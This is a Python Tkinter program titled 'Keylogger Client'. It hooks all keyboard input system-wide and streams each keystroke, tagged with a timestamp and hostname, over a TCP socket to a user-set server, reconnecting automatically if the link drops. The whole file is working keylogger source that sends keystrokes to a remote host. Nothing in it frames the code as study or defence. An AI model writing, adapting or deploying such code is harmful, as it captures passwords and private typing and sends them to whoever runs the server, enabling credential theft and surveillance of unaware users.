import keyboard
import socket
import threading
import time
from datetime import datetime
import tkinter as tk
from tkinter import scrolledtext, messagebox

class KeyloggerClientGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger Client")
        self.root.geometry("600x500")
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        
        # Client configuration
        self.server_host = '127.0.0.1'
        self.server_port = 5555
        self.client_socket = None
        self.running = False
        self.connected = False
        self.retry_interval = 5
        self.client_thread = None
        
        # Keyboard monitoring state
        self.monitoring = False
        
        # Create GUI elements
        self.create_widgets()
        
    def create_widgets(self):
        # Top frame for server connection
        self.conn_frame = tk.LabelFrame(self.root, text="Server Connection", padx=10, pady=10)
        self.conn_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # Server host and port entry
        tk.Label(self.conn_frame, text="Server Host:").grid(row=0, column=0, padx=5, sticky=tk.W)
        self.host_entry = tk.Entry(self.conn_frame, width=15)
        self.host_entry.insert(0, self.server_host)
        self.host_entry.grid(row=0, column=1, padx=5, sticky=tk.W)
        
        tk.Label(self.conn_frame, text="Port:").grid(row=0, column=2, padx=5, sticky=tk.W)
        self.port_entry = tk.Entry(self.conn_frame, width=6)
        self.port_entry.insert(0, str(self.server_port))
        self.port_entry.grid(row=0, column=3, padx=5, sticky=tk.W)
        
        # Connection control buttons
        self.connect_button = tk.Button(self.conn_frame, text="Connect", command=self.connect_to_server)
        self.connect_button.grid(row=0, column=4, padx=10)
        
        self.disconnect_button = tk.Button(self.conn_frame, text="Disconnect", command=self.disconnect, state=tk.DISABLED)
        self.disconnect_button.grid(row=0, column=5, padx=10)
        
        # Status label
        self.status_var = tk.StringVar()
        self.status_var.set("Status: Disconnected")
        self.status_label = tk.Label(self.conn_frame, textvariable=self.status_var, fg="red")
        self.status_label.grid(row=1, column=0, columnspan=6, pady=5, sticky=tk.W)
        
        # Keylogger control frame
        self.control_frame = tk.LabelFrame(self.root, text="Keylogger Control", padx=10, pady=10)
        self.control_frame.pack(fill=tk.X, padx=10, pady=5)
        
        # Start/Stop keylogger buttons
        self.start_button = tk.Button(self.control_frame, text="Start Monitoring", command=self.start_monitoring, state=tk.DISABLED)
        self.start_button.pack(side=tk.LEFT, padx=10)
        
        self.stop_button = tk.Button(self.control_frame, text="Stop Monitoring", command=self.stop_monitoring, state=tk.DISABLED)
        self.stop_button.pack(side=tk.LEFT, padx=10)
        
        # Monitoring status
        self.monitor_var = tk.StringVar()
        self.monitor_var.set("Monitoring: Inactive")
        self.monitor_label = tk.Label(self.control_frame, textvariable=self.monitor_var, fg="red")
        self.monitor_label.pack(side=tk.LEFT, padx=20)
        
        # Log frame (for local viewing of what's being sent)
        self.log_frame = tk.LabelFrame(self.root, text="Local Log (Keys Being Sent)", padx=10, pady=10)
        self.log_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        self.log_text = scrolledtext.ScrolledText(self.log_frame)
        self.log_text.pack(fill=tk.BOTH, expand=True)
        self.log_text.config(state=tk.DISABLED)
        
        # Auto-scroll toggle
        self.autoscroll_var = tk.BooleanVar(value=True)
        self.autoscroll_check = tk.Checkbutton(self.log_frame, text="Auto-scroll", variable=self.autoscroll_var)
        self.autoscroll_check.pack(anchor=tk.W)
        
        # Clear log button
        self.clear_button = tk.Button(self.log_frame, text="Clear Log", command=self.clear_log)
        self.clear_button.pack(side=tk.RIGHT, padx=5, pady=5)
    
    def connect_to_server(self):
        """Connect to the keylogger server"""
        try:
            self.server_host = self.host_entry.get()
            self.server_port = int(self.port_entry.get())
            
            # Start connection in a separate thread
            self.running = True
            self.client_thread = threading.Thread(target=self._connect_thread)
            self.client_thread.daemon = True
            self.client_thread.start()
            
            # Update UI
            self.connect_button.config(state=tk.DISABLED)
            self.host_entry.config(state=tk.DISABLED)
            self.port_entry.config(state=tk.DISABLED)
            self.status_var.set("Status: Connecting...")
            self.status_label.config(fg="orange")
            
        except Exception as e:
            messagebox.showerror("Connection Error", f"Failed to start connection: {e}")
    
    def _connect_thread(self):
        """Connection thread function"""
        while self.running and not self.connected:
            try:
                self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.client_socket.connect((self.server_host, self.server_port))
                self.connected = True
                
                # Update UI in main thread
                self.root.after(0, self._update_connected_state)
                
            except socket.error as e:
                # Update UI to show retry
                self.root.after(0, lambda: self.status_var.set(f"Status: Connection failed, retrying in {self.retry_interval}s..."))
                
                # Sleep and retry
                time.sleep(self.retry_interval)
    
    def _update_connected_state(self):
        """Update UI for connected state"""
        self.status_var.set(f"Status: Connected to {self.server_host}:{self.server_port}")
        self.status_label.config(fg="green")
        self.disconnect_button.config(state=tk.NORMAL)
        self.start_button.config(state=tk.NORMAL)
        self.log_message(f"Connected to server at {self.server_host}:{self.server_port}")
    
    def disconnect(self):
        """Disconnect from the server"""
        # Stop monitoring if active
        if self.monitoring:
            self.stop_monitoring()
        
        # Set flags to stop threads
        self.running = False
        self.connected = False
        
        # Close socket
        if self.client_socket:
            try:
                self.client_socket.close()
            except:
                pass
            self.client_socket = None
        
        # Update UI
        self.connect_button.config(state=tk.NORMAL)
        self.disconnect_button.config(state=tk.DISABLED)
        self.host_entry.config(state=tk.NORMAL)
        self.port_entry.config(state=tk.NORMAL)
        self.status_var.set("Status: Disconnected")
        self.status_label.config(fg="red")
        
        self.log_message("Disconnected from server")
    
    def start_monitoring(self):
        """Start keyboard monitoring"""
        if not self.connected:
            messagebox.showwarning("Not Connected", "Please connect to a server first")
            return
        
        self.monitoring = True
        
        # Register keyboard hook
        keyboard.on_press(self.on_key_press)
        
        # Update UI
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.monitor_var.set("Monitoring: Active")
        self.monitor_label.config(fg="green")
        
        self.log_message("Keyboard monitoring started")
    
    def stop_monitoring(self):
        """Stop keyboard monitoring"""
        self.monitoring = False
        
        # Unregister keyboard hook
        keyboard.unhook_all()
        
        # Update UI
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        self.monitor_var.set("Monitoring: Inactive")
        self.monitor_label.config(fg="red")
        
        self.log_message("Keyboard monitoring stopped")
    
    def on_key_press(self, event):
        """Function called on keyboard press event"""
        if not self.monitoring or not self.connected:
            return
            
        key = event.name
        
        # Format special keys to be more readable
        if len(key) > 1:
            if key == "space":
                key = "SPACE"
            elif key == "enter":
                key = "ENTER"
            elif key == "tab":
                key = "TAB"
            elif key == "backspace":
                key = "BACKSPACE"
            elif key == "shift":
                key = "SHIFT"
            elif key == "ctrl":
                key = "CTRL"
            elif key == "alt":
                key = "ALT"
                
        # Get current timestamp and hostname
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
        hostname = socket.gethostname()
        
        # Format the log entry
        log_entry = f"{timestamp} | Host: {hostname} | Key: {key}\n"
        
        # Send the log entry to the server
        try:
            self.client_socket.send(log_entry.encode('utf-8'))
            
            # Update local log in main thread
            self.root.after(0, lambda: self.log_message(log_entry.strip()))
        except socket.error:
            # Connection lost
            self.root.after(0, lambda: self.handle_connection_lost())
    
    def handle_connection_lost(self):
        """Handle lost connection to server"""
        if not self.connected:
            return  # Already handled
            
        self.connected = False
        
        if self.monitoring:
            self.stop_monitoring()
        
        self.status_var.set("Status: Connection lost, attempting to reconnect...")
        self.status_label.config(fg="orange")
        
        # Start reconnection thread
        if self.running:
            reconnect_thread = threading.Thread(target=self._connect_thread)
            reconnect_thread.daemon = True
            reconnect_thread.start()
    
    def log_message(self, message):
        """Add a message to the log window"""
        self.log_text.config(state=tk.NORMAL)
        self.log_text.insert(tk.END, message + "\n")
        if self.autoscroll_var.get():
            self.log_text.see(tk.END)
        self.log_text.config(state=tk.DISABLED)
    
    def clear_log(self):
        """Clear the log window"""
        self.log_text.config(state=tk.NORMAL)
        self.log_text.delete(1.0, tk.END)
        self.log_text.config(state=tk.DISABLED)
    
    def on_closing(self):
        """Handle window closing"""
        if self.monitoring or self.connected:
            if messagebox.askyesno("Quit", "Keylogger is still active. Stop and quit?"):
                if self.monitoring:
                    self.stop_monitoring()
                if self.connected:
                    self.disconnect()
                self.root.destroy()
        else:
            self.root.destroy()

if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerClientGUI(root)
    root.mainloop()